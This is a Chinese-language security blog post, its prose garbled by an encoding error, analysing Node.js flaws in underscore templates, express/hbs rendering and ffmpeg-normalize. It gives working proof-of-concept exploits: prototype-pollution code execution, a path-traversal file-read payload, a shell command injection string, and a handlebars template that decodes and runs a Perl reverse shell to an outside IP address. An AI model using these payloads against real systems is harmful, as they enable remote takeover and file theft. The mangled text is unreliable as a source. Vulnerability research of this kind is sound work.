<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;hello: &lt;%= name %&gt;&quot;</span>);</span><br><span class="line">compiled(&#123;<span class="attr">name</span>: <span class="string">&#x27;moe&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>



<p>å®˜æ–¹ç»™å‡ºçš„èŒƒä¾‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;underscore&#x27;</span>);</span><br><span class="line"><span class="comment">// _.templateSettings.variable = &quot;a = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;)&quot;;</span></span><br><span class="line"><span class="comment">// const t = _.template(&quot;&quot;)();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;hello: &lt;%= name %&gt;&quot;</span>);</span><br><span class="line">b =  compiled(&#123;<span class="attr">name</span>: <span class="string">&#x27;moe&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;&lt;% print(&#x27;Hello &#x27; + epithet); %&gt;&quot;</span>);</span><br><span class="line">compiled(&#123;<span class="attr">epithet</span>: <span class="string">&quot;stooge&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰å°±å’Œejså¾ˆåƒï¼Œè¿™ä¸ªä¹Ÿæ˜¯æ¨¡æ¿æ¸²æŸ“å‡½æ•°ï¼Œä¸ç®¡äº†èµ°ä¸€ä¸ªF5ï¼Œå•æ­¥è°ƒå‡ ä¸‹ï¼Œå¾ˆå¿«å°±å¯ä»¥å‘ç°ä¸€ä¸ªå¯ç–‘çš„åœ°æ–¹ï¼š</p>
<p><img src="image-20210624141041637.png" alt="image-20210624141041637"></p>
<p>è¿™é‡Œç›´æ¥newäº† Fucntion( settings.variable ),è‹¥æˆ‘ä»¬èµ‹å€¼äº†ï¼Œåˆ™ä¼šå½¢æˆè¿™æ ·çš„ç»“æœï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">a = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;touch HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//var __t,__p=&#x27;&#x27;,__j=Array.prototype.join,print=function()&#123;__p+=__j.call(arguments,&#x27;&#x27;);&#125;;</span></span><br><span class="line"><span class="comment">//__p+=&#x27;&#x27;;</span></span><br><span class="line"><span class="comment">//return __p;</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥é€ æˆäº†ä»£ç æ‰§è¡Œçš„ç»“æœï¼Œå¦‚æœæ˜¯æœªç»™settings.varibaleèµ‹å€¼çš„æƒ…å†µï¼Œåˆ™æ˜¯ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">obj,_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj||&#123;&#125;</span>)</span>&#123;</span><br><span class="line">__p+=<span class="string">&#x27;hello: &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªæŒ‡ä»¤å¾ˆå®¹æ˜“å’ŒåŸå‹é“¾æ±¡æŸ“ä¸€èµ·è¢«æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘åˆå†’å‡ºäº†ä¸€ä¸ªæƒ³æ³•ï¼Œéš¾é“ä¸€å®šè¦æ„é€ è¿™æ ·ï¼š</p>
<p> const t = _.template(â€œâ€)();</p>
<p>æ— å‚æ•°æ‰å¯ä»¥å—ï¼Œåˆ©ç”¨å®˜æ–¹çš„å®ä¾‹ï¼Œæˆ‘å‘ç°æœç„¶æŠ¥é”™äº†</p>
<p><img src="image-20210624155655722.png" alt="image-20210624155655722"></p>
<p>è·Ÿè¸ªæ‰“å°ä¹‹åå‘ç°äº†æˆ‘çš„å‡½æ•°å˜æˆäº†è¿™æ ·å­çš„ä¸€ä¸ªæƒ…å†µ:</p>
<p><img src="image-20210624162337376.png" alt="image-20210624162337376"></p>
<p>æˆ‘å’Œæ­£å¸¸ç”Ÿæˆçš„å‡½æ•°è¿›è¡Œä¸€ä¸‹å¯¹æ¯”ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">epithet = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;touch 1234&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> print(<span class="string">&#x27;Hello &#x27;</span> + epithet); </span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">obj,_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj||&#123;&#125;</span>)</span>&#123;</span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> print(<span class="string">&#x27;Hello &#x27;</span> + epithet); </span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>å‘ç°å°‘äº†ä¸€æ®µwithçš„å‡½æ•°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;var __t,__p=&#x27;</span><span class="string">&#x27;,__j=Array.prototype.join,print=function()&#123;__p+=__j.call(arguments,&#x27;</span><span class="string">&#x27;);&#125;;\nwith(obj||&#123;&#125;)&#123;\n__p+=&#x27;</span><span class="string">&#x27;;\n print(&#x27;</span>Hello <span class="string">&#x27; + epithet); \n__p+=&#x27;</span><span class="string">&#x27;;\n&#125;\nreturn __p;\n&#x27;</span></span><br></pre></td></tr></table></figure>



<p>å›çœ‹ä¹‹åæ˜¯åœ¨è¿™ä¸ªè¯­å¥ä¸Šæ·»åŠ çš„ï¼š</p>
<p><img src="image-20210624163056355.png" alt="image-20210624163056355"></p>
<p>è¿™å°±å¾ˆå°´å°¬äº†ï¼Œæ¯”è¾ƒæˆ‘åˆä¸èƒ½æ§åˆ¶è¿™æ®µå‡½æ•°ï¼Œåªèƒ½åœ¨å†æƒ³åˆ«çš„åŠæ³•äº†</p>
<p>è‹¥æ— å‚æ•°å½¢æˆçš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">name = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;echo 123&gt;&gt;HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27; &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>æœ‰å‚æ•°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">name = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;echo 123&gt;&gt;HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27; &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>ä¸¤è€…ç”Ÿæˆçš„å‚æ•°æ˜¯ä¸€æ ·çš„ï¼Œé—®é¢˜å°±åœ¨äºè‹¥è¾“å…¥å‚æ•°äº†ï¼Œnameå°±ä¸å†æ˜¯æˆ‘ä»¬è®¾ç½®çš„é»˜è®¤å€¼ï¼Œè¿™æ ·çš„è¯å°±ä¼šå¯¼è‡´å‚æ•°ä¸å†å—æ§åˆ¶ã€‚</p>
<p><img src="image-20210624165310430.png" alt="image-20210624165310430"></p>
<p>æ€ªä¸å¾—è¿™ä¸ªæ¼æ´åªæœ‰5.5åˆ†ï¼Œè¿™ä¸ªçš„åˆ©ç”¨æ¡ä»¶è¿‡äºè‹›åˆ»äº†,å…ˆä¸è¯´å“ªä¸ªå¼€å‘äººå‘˜æ²¡äº‹ä¼šç”¨è¿™ä¸ªå‡½æ•° ï¼Œåˆåªä¼šåœ¨å¾ˆå°‘çš„æƒ…å†µä¸‹å‡ºç°å®šä¹‰äº†æ¨¡æ¿å´ä¸èµ‹å€¼çš„æƒ…å†µ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="comment">// obj.__proto__.variable = &quot;epithet = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;))&#123; console.log(123); &#125;//&quot;;</span></span><br><span class="line">obj.__proto__.variable = <span class="string">&quot;name = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;echo 123&gt;&gt;HELLO&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot; &lt;%= name %&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a; <span class="comment">// å‡è®¾aä¸ºä»æ•°æ®åº“ä¸­æ‰“å‡ºæ¥çš„å€¼,å¹¶æ²¡æœ‰æœç´¢åˆ°å€¼è¿”å›äº†ä¸€ä¸ªç©ºå€¼çš„æƒ…å†µä¸‹æ‰æœ‰å¯èƒ½è¯ç”Ÿæ¼æ´ã€‚</span></span><br><span class="line"><span class="keyword">var</span> c = compiled(a);</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br></pre></td></tr></table></figure>



<h1 id="6-hbsæ¡†æ¶ä¸expressçš„ç¼ºé™·"><a href="#6-hbsæ¡†æ¶ä¸expressçš„ç¼ºé™·" class="headerlink" title="6. hbsæ¡†æ¶ä¸expressçš„ç¼ºé™·"></a>6. hbsæ¡†æ¶ä¸expressçš„ç¼ºé™·</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.shoebpatel.com&#x2F;2021&#x2F;01&#x2F;23&#x2F;The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps&#x2F;</span><br></pre></td></tr></table></figure>



<p>è¿™æ˜¯expressçš„å¤©ç”Ÿçš„é—®é¢˜äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹è¿™ä¸¤è¡Œä»£ç ï¼Œæ„Ÿè§‰æ˜¯ä¸æ˜¯æ¯«æ— ç¼ºé™·ï¼Ÿä½†æ˜¯å´ä¼šé€ æˆå¾ˆä¸¥é‡çš„åæœï¼Œæ‰“å¼€DEBUGæ¨¡å¼è·Ÿç€è°ƒï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°æˆ‘ä»¬çš„ç¬¬äºŒæ®µè¾“å…¥è¢«è®¾è®¡åˆ°äº†optionså½“ä¸­</p>
<p><img src="image-20210624203415511.png" alt="image-20210624203415511"></p>
<p>å’Œejsä¸€æ ·ï¼Œæˆ‘ä»¬å¿«è¿›åˆ° tryRenderå‡½æ•°é‡Œï¼Œè¿™é‡Œç”¨çš„hbsæ¡†æ¶ï¼Œæ‰€ä»¥å°±ä¼šè‡ªåŠ¨çš„åˆ‡è¿›å»ä¹‹åä¼šè¿›å…¥ä¸€é•¿ä¸²çš„ç¼“å­˜å¤„ç†å½“ä¸­ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œç›´åˆ°è¿™ä¸€è¡Œ</p>
<p><img src="image-20210624203728753.png" alt="image-20210624203728753"></p>
<p>æˆ‘ä»¬å‘ç°optionsåˆè¢«åŸå°ä¸åŠ¨çš„å¯¼å…¥è¿›æ¥äº†åœ¨144è¡Œå½“ä¸­åˆå–äº†optionsçš„layout</p>
<p><img src="image-20210624203815875.png" alt="image-20210624203815875"></p>
<p>ä¹‹åå°±ç›´æ¥çš„å–å‡ºlayoutä¸­çš„è·¯å¾„</p>
<p><img src="image-20210624204005095.png" alt="image-20210624204005095"></p>
<p>å½“èƒ½å¤Ÿè¯»å–åˆ°ä¸œè¥¿çš„æ—¶å€™ï¼Œè°ƒç”¨ tryReadFileAndCacheå‡½æ•°ã€‚</p>
<p><img src="image-20210624204109775.png" alt="image-20210624204109775"></p>
<p>è¯»å–æ–‡ä»¶ï¼Œå†ä¹‹åå°±ç›´æ¥</p>
<p><img src="image-20210624204208342.png" alt="image-20210624204208342"></p>
<p>æŠŠlayoutç›´æ¥æ¸²æŸ“ä¸Šå»äº†ï¼Œé€ æˆäº†ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>â€‹    å…¶å®é€ æˆè¿™æ ·çš„é—®é¢˜æœ‰ä¸¤ä¸ª</p>
<ul>
<li>expressçš„æ¸²æŸ“æœºåˆ¶é—®é¢˜ï¼Œexpressä¼šæ¯«æ— æ¡ä»¶çš„æ¥æ”¶æ‰€æœ‰çš„ä¸œè¥¿ï¼Œå¹¶å…è®¸è¿™äº›æ’ä»¶è¿›è¡Œäº’ç›¸çš„è°ƒç”¨</li>
<li>å¼€å‘è€…ä¸åº”è¯¥æ¥æ”¶å…¨éƒ¨çš„å‚æ•°ï¼Œè€Œåº”è¯¥é€‰æ‹©çš„è¿›è¡Œæ¥æ”¶ï¼Œä½†æ˜¯ï¼Œä¾‹å¦‚è¿™æ ·å­æ¥å†™ï¼š</li>
</ul>
<p><img src="image-20210624204736513.png" alt="image-20210624204736513"></p>
<p>ä½†æ˜¯å³ä½¿æ˜¯è¿™æ ·çš„æ“ä½œï¼Œä¹Ÿä¾ç„¶å¯èƒ½å¯¼è‡´è¢«è¯»å–æ–‡ä»¶ï¼Œå› ä¸ºå¯ä»¥è¿›è¡ŒåŸå‹é“¾çš„æ±¡æŸ“ã€‚è¿™æ ·å­ä¼šå¯¼è‡´ç”¨æˆ·æ¯æ¬¡æ¸²æŸ“å‚æ•°éƒ½ä¼šå¯¼è‡´è¢«è¯»å–ä»»æ„æ–‡ä»¶ï¼</p>
<p>poc:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">	obj.__proto__.layout = <span class="string">&quot;../../../../../../../../flag.txt&quot;</span></span><br><span class="line">	<span class="built_in">console</span>.log([].layout);</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, &#123;profile&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="image-20210624205016453.png" alt="image-20210624205016453"></p>
<p>ä½†æ˜¯ä»…ä»…æ˜¯ä»»æ„æ–‡ä»¶è¯»å–å¹¶ä¸èƒ½å…„å¼Ÿæ»¡è¶³ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥RCEå°±æ›´å¥½äº†ã€‚</p>
<p>RCEæ–‡ç« </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.z3ratu1.cn&#x2F;%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html</span><br></pre></td></tr></table></figure>



<p>RCEçš„å‰æï¼š</p>
<ul>
<li><p>hbsçš„ç‰ˆæœ¬ ä½äº 4.0.3</p>
<ul>
<li>èƒ½å¤Ÿä¸Šä¼ å¸¦æœ‰åç¼€çš„æ–‡ä»¶(ä¸æ˜¯hbsç»“å°¾çš„ä¹Ÿå®Œå…¨æ²¡é—®é¢˜)</li>
</ul>
</li>
</ul>
<p>ä¸Šä¼ æ–‡ä»¶1.jpgï¼š</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% raw %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iODEuNjkuMjAxLjY1IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash&#x27;);&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">&#123;% endraw %&#125;</span></span><br></pre></td></tr></table></figure>

<p>å›åˆ°</p>
<p><img src="image-20210624210219027.png" alt="image-20210624210219027"></p>
<p>æˆåŠŸgetshellï¼ï¼</p>
<p><img src="image-20210624210233392.png" alt="image-20210624210233392"></p>
<h1 id="7-ffmpeg-normalize"><a href="#7-ffmpeg-normalize" class="headerlink" title="7.ffmpeg-normalize"></a>7.ffmpeg-normalize</h1><p>ç‰ˆæœ¬ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ffmpeg-normalize&quot;</span>: <span class="string">&quot;^1.8.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è¯¥åº“æ˜¯ç”¨äºå¤„ç†éŸ³é¢‘çš„ï¼Œå¯ä»¥å°†æˆ‘ä»¬çš„éŸ³é¢‘çš„å£°éŸ³å¤§å°ç»Ÿä¸€ï¼ˆï¼Ÿï¼‰æˆ‘ä¸æ˜¯å¾ˆæ‡‚ï¼Œå®˜æ–¹ç»™å‡ºçš„ä½¿ç”¨èŒƒä¾‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target:</span><br><span class="line">        &#123;</span><br><span class="line">            input_i: -<span class="number">23</span>,</span><br><span class="line">            input_lra: <span class="number">7.0</span>,</span><br><span class="line">            input_tp: -<span class="number">2.0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Normalized</span></span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Some error happened</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>æ¼æ´äº§ç”Ÿäºinputæ¨¡å—ï¼Œpocï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4; touch HACKED; #&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target: &#123;<span class="attr">input_i</span>: -<span class="number">23</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">false</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log()&#125;);</span><br></pre></td></tr></table></figure>

<p>è€æ ·å­ï¼Œåœ¨inputè¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼Œå‡½æ•°è¿˜æ˜¯çŸ­çš„ï¼Œè¿‡äº†å‡ æ­¥å°±çœ‹è§ï¼š</p>
<p><img src="image-20210625202510490.png" alt="image-20210625202510490"></p>
<p><img src="/image-20210625203237131.png" alt="image-20210625203237131"></p>
<p>è¿˜å°±é‚£ä¸ªæ‰§è¡Œã€‚</p>
<p><img src="image-20210625203416754.png" alt="image-20210625203416754"></p>
<p><img src="image-20210625203424292.png" alt="image-20210625203424292"></p>
<p>ç›´æ¥å‘½ä»¤æ‹¼æ¥ç„¶åæ‰§è¡Œäº†ï¼Œé‚£æ˜¯çœŸçš„ç®€å•</p>
<p><img src="image-20210625203511035.png" alt="image-20210625203511035"></p>
<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç”¨å†’å·ï¼Œç„¶åæ‰£ä»»æ„ä»£ç ï¼Œä¹‹åç”¨#å·çœç•¥åé¢çš„å³å¯ï¼</p>
<p>æ„Ÿè§‰å¾ˆå¤šnpmçš„å¼€å‘äººå‘˜éƒ½æ˜¯æ²¡æœ‰ä»€ä¹ˆå®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‹¼æ¥å‘½ä»¤ç„¶åexecã€‚</p>
<p>éšæ‰‹å¼¹ä¸ªshell</p>
